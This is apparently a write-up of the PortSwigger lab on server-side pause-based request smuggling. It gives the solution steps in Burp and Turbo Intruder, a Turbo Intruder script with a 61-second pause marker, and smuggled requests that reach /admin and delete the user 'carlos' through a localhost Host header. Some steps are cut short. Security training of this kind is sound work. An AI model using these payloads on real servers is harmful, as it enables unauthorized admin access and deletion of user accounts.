# Lab: Server-side pause-based request smuggling

**Official lab:** [https://portswigger.net/web-security/request-smuggling/browser/pause-based-desync/lab-server-side-pause-based-request-smuggling](https://portswigger.net/web-security/request-smuggling/browser/pause-based-desync/lab-server-side-pause-based-request-smuggling)

## Lab idea

This challenge explores pause-based server-side desynchronization in a setup where the frontend streams requests and the backend may retain a connection after a timeout. It practices assessing timing-sensitive CL.0 behavior and its impact on backend access.

## Vulnerability in brief
HTTP request smuggling (often called **HTTP desync**) is a vulnerability class in which components that process a sequence of HTTP requests disagree about where one request ends and the next begins. In a common deployment, a frontend proxy or load balancer forwards multiple user requests over a reused connection to a backend. If the two systems parse an ambiguous request differently, bytes treated as body by one may be read as the start of another request by the other. This can cause an attacker-controlled prefix to interfere with a later request.

## Solution idea
1. In Burp, notice from the Server response header that the lab is using Apache 2.4.52 .
2. In Burp Repeater, try issuing a request for a valid directory without including a trailing slash, for example, GET /resources .
3. Right-click the request and select Extensions > Turbo Intruder > Send to Turbo Intruder .
4. In Turbo Intruder, convert the request to a POST request (right-click and select Change request method ).
- …
6. Go back to the attack configuration screen.
7. To prevent Turbo Intruder from pausing after both occurrences of \r\n\r\n in the request, update the pauseMarker argument so that it only matches the end of the first set of headers, for…
8. After 61 seconds, the lab is solved.

## Payloads / key values
- `Server`
- `Apache 2.4.52`
- `GET /resources`
- `/resources/`
- `POST`
- `Connection`
- `keep-alive`
- `GET /admin`
- `POST /resources HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net Cookie: session=YOUR-SESSION-COOKIE Connection: keep-alive Content-Type: application/x-www-form-urlencoded Content-Length: CORRECT GET /admin/ HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net`
- `\r\n\r\n`
- `def queueRequests(target, wordlists): engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=1, requestsPerConnection=500, pipeline=False ) engine.queue(target.req, pauseMarker=['\r\n\r\n'], pauseTime=61000) engine.queue(target.req) def handleResponse(req, interesting): table.add(req)`
- `POST /resources`
- `GET /admin/`
- `Host`
- `localhost`
- `/admin/delete`
- `username`
- `csrf`
- `POST /resources HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net Cookie: session=YOUR-SESSION-COOKIE Connection: keep-alive Content-Type: application/x-www-form-urlencoded Content-Length: CORRECT POST /admin/delete/ HTTP/1.1 Host: localhost Content-Type: x-www-form-urlencoded Content-Length: CORRECT csrf=YOUR-CSRF-TOKEN&username=carlos`
- `pauseMarker`
- `pauseMarker=['Content-Length: CORRECT\r\n\r\n']`

## Official source
- [PortSwigger Academy: Lab: Server-side pause-based request smuggling](https://portswigger.net/web-security/request-smuggling/browser/pause-based-desync/lab-server-side-pause-based-request-smuggling)
